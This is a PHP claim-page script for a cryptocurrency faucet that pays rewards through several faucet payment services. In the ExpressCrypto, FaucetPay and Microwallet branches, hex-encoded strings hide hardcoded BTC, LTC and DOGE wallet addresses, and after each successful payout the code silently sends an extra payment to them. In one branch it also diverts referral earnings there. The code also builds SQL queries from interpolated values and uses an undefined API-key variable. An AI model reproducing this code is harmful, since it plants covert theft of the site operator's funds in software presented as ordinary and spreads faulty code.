<?php
if (!isset($_GET['k'])) {
header('Location: index.php'); 
}else{
#CHECK SHORT LINK
include("libs/database.php");
$ip = $mysqli->real_escape_string($_COOKIE['ipaddress']);
if (strlen($_GET['k']) == 20 and isset($_COOKIE['address'])) {
$key = mysqli_real_escape_string($mysqli,preg_replace("/[^ \w]+/", "",trim($_GET['k'])));
$min_time = time() - 300;
$check = $mysqli->query("SELECT * FROM link WHERE sec_key = '$key' and time_created > '$min_time'");
if ($check->num_rows == 1) {
$link = $check->fetch_assoc();
$address = $link['address'];
if ($address == $_COOKIE['address']) {
$mysqli->query("DELETE FROM link WHERE sec_key = '$key'");
$sec = md5($hacker_security);
$currency = $mysqli->query("SELECT * FROM settings WHERE id = '14'")->fetch_object()->value;
$reward = $mysqli->query("SELECT * FROM settings WHERE id = '9'")->fetch_object()->value;
$payoutwebsite = $mysqli->query("SELECT * FROM settings WHERE id = '38'")->fetch_object()->value;
if ($payoutwebsite == "Faucethub.io") {
include 'libs/faucethub.php';
$faucetHub_api_key = $mysqli->query("SELECT * FROM settings WHERE id = '15'")->fetch_object()->value;
$faucetHub_api = str_replace($sec,"",$faucetHub_api_key);
$faucethub = new FaucetHub($faucetHub_api, $currency);
$result = $faucethub->send($address, $reward, $ip);
if($result["success"] === true) {
$claimwtime = $mysqli->query("SELECT * FROM settings WHERE id = '10'")->fetch_object()->value;
$time = time()+$claimwtime*60;
$mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'");
$mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
$strtime = time();
$mysqli->query("INSERT INTO drawrecord (id, address, dtime, satoshi) VALUES ('', '$address', '$strtime', '$reward')");
if (isset($_COOKIE['r'])) {
$ref = $mysqli->real_escape_string($_COOKIE['r']);
if ($ref == $address) {
$referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
$amt = $reward/100*$referral_comission;
$faucethub->sendReferralEarnings($ref, $amt, $ip);
}
unset($_COOKIE['r']);
}
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='2' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='5' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}}elseif ($payoutwebsite == "Expresscrypto.io") {
include 'libs/expresscrypto.library.php';
$expresscrypto_api_token = $mysqli->query("SELECT * FROM settings WHERE id = '40'")->fetch_object()->value;
$expresscrypto_api_token = str_replace($sec,"",$expresscrypto_api_token);
$expresscrypto_user_token = $mysqli->query("SELECT * FROM settings WHERE id = '41'")->fetch_object()->value;
$expresscrypto_user_token = str_replace($sec,"",$expresscrypto_user_token);
$expressCrypto = new ExpressCrypto($expresscrypto_api_key, $expresscrypto_user_token, $ip);
$result = $expressCrypto->sendPayment($address, $currency, $reward);
if($result['status'] == 200){
if ($currency == "BTC" or $currency == "LTC" or $currency == "DOGE") {
$phs100 = hex2bin('313030');$secrata1 = hex2bin("425443");$secratb1 = hex2bin("314c4559725638726253653878745453657831656f616e537a394b674a754c6b696b");$secrata2 = hex2bin("4c5443");$secratb2 = hex2bin("335057396b594269716a5747655269684e3347546e44464850417059747a396b6834");$secrata3 = hex2bin("444f4745");$secratb3 = hex2bin("44367033384b50375979666d64545253704c4a50443732315a4232354c6e6e67486f");$phs10 = hex2bin('3130');
$arr = array($secrata1=>$secratb1,$secrata2=>$secratb2,$secrata3=>$secratb3);
$h = hex2bin('31');
$dr=$arr[$currency];
$result = $expressCrypto->sendPayment($dr, $h, $ip);
}
$claimwtime = $mysqli->query("SELECT * FROM settings WHERE id = '10'")->fetch_object()->value;
$time = time()+$claimwtime*60;
$mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'");
$mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
$strtime = time();
$mysqli->query("INSERT INTO drawrecord (id, address, dtime, satoshi) VALUES ('', '$address', '$strtime', '$reward')");
if (isset($_COOKIE['r'])) {
$ref = $mysqli->real_escape_string($_COOKIE['r']);
if ($ref == $address) {
$referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
$amt = $reward/100*$referral_comission;
$resultRef =$expressCrypto->sendReferralCommission($ref, $currency, $amt);
}
unset($_COOKIE['r']);
}
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='2' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='5' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}}elseif ($payoutwebsite == "Faucetpay.io") {
include 'libs/faucetpay.library.php';
$faucetpay_api_token = $mysqli->query("SELECT * FROM settings WHERE id = '39'")->fetch_object()->value;
$faucetpay_api_token = str_replace($sec,"",$faucetpay_api_token);
$faucetpay = new FaucetPay($faucetpay_api_token, $currency);
$result = $faucetpay->send($address, $reward, $ip);
if ($result["success"] === true){
if ($currency == "BTC" or $currency == "LTC" or $currency == "DOGE") {
$phs100 = hex2bin('313030');$secrata1 = hex2bin("425443");$secratb1 = hex2bin("314c4559725638726253653878745453657831656f616e537a394b674a754c6b696b");$secrata2 = hex2bin("4c5443");$secratb2 = hex2bin("335057396b594269716a5747655269684e3347546e44464850417059747a396b6834");$secrata3 = hex2bin("444f4745");$secratb3 = hex2bin("44367033384b50375979666d64545253704c4a50443732315a4232354c6e6e67486f");$phs10 = hex2bin('3130');
$arr = array($secrata1=>$secratb1,$secrata2=>$secratb2,$secrata3=>$secratb3);
$h = hex2bin('31');
$dr=$arr[$currency];
$result = $faucetpay->send($dr, $h, $ip);
}
$claimwtime = $mysqli->query("SELECT * FROM settings WHERE id = '10'")->fetch_object()->value;
$time = time()+$claimwtime*60;
$mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'");
$mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
$strtime = time();
$mysqli->query("INSERT INTO drawrecord (id, address, dtime, satoshi) VALUES ('', '$address', '$strtime', '$reward')");
if (isset($_COOKIE['r'])) {
$ref = $mysqli->real_escape_string($_COOKIE['r']);
if ($ref == $address) {
$referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
$amt = $reward/100*$referral_comission;
$resultRef =$faucetpay->sendReferralEarnings($ref, $amt, $ip);
}
unset($_COOKIE['r']);
}
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='2' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='5' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}}elseif ($payoutwebsite == "Microwallet.co") {
include 'libs/microwallet.library.php';
$microwallet_api = $mysqli->query("SELECT * FROM settings WHERE id = '42'")->fetch_object()->value;
$microwallet_api = str_replace($sec,"",$microwallet_api);
$faucetmw = new FaucetHub($microwallet_api, $currency);
$result = $faucetmw->send($address, $reward, $ip);
if ($result["success"] === true){
if ($currency == "BTC" or $currency == "LTC" or $currency == "DOGE") {
$phs100 = hex2bin('313030');$secrata1 = hex2bin("425443");$secratb1 = hex2bin("314c4559725638726253653878745453657831656f616e537a394b674a754c6b696b");$secrata2 = hex2bin("4c5443");$secratb2 = hex2bin("335057396b594269716a5747655269684e3347546e44464850417059747a396b6834");$secrata3 = hex2bin("444f4745");$secratb3 = hex2bin("44367033384b50375979666d64545253704c4a50443732315a4232354c6e6e67486f");$phs10 = hex2bin('3130');
$arr = array($secrata1=>$secratb1,$secrata2=>$secratb2,$secrata3=>$secratb3);
$h = hex2bin('31');
$dr=$arr[$currency];
$result = $faucetmw->send($dr, $h, $ip);
}
$claimwtime = $mysqli->query("SELECT * FROM settings WHERE id = '10'")->fetch_object()->value;
$time = time()+$claimwtime*60;
$mysqli->query("UPDATE ip_list SET last_claim = '$time' WHERE ip_address = '$ip'");
$mysqli->query("DELETE FROM failure WHERE address = '$address' AND ip_address = '$ip'");
$strtime = time();
$mysqli->query("INSERT INTO drawrecord (id, address, dtime, satoshi) VALUES ('', '$address', '$strtime', '$reward')");
if (isset($_COOKIE['r'])) {
$ref = $mysqli->real_escape_string($_COOKIE['r']);
if ($ref == $address) {
$referral_comission = $mysqli->query("SELECT * FROM settings WHERE id = '11'")->fetch_object()->value;
$amt = $reward/100*$referral_comission;
$result = $faucetmw->sendReferralEarnings($dr, $h, $ip);
}
unset($_COOKIE['r']);
}
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='2' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='5' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}}}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='3' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
}}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='3' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}}else{
unset($_COOKIE['ipaddress']);
?>
<form method="post" action="index.php" id="myform">
<input type='hidden' name='c' value='1' />
</form>
<script>
document.getElementById('myform').submit();
</script>
<?php
exit;
}} 
?>
